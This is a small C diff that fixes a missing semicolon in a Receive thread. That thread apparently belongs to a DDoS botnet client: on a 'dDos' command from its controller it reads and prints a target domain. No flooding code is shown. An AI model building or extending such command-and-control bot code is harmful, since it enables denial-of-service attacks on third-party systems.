@@ -75,7 +75,7 @@ void *Receive(void *argv){
 		if(!strcmp(recvMsg, "dDos")){
 
             printf("Do Dos: Send Packet!!!\n");
-            recv(s_fd, target_domain, MAX_MESSAGE_LEN, 0)
+            recv(s_fd, target_domain, MAX_MESSAGE_LEN, 0);
             printf("Target:%s\n",target_domain);
             memset(target_domain, 0, 100);
         }
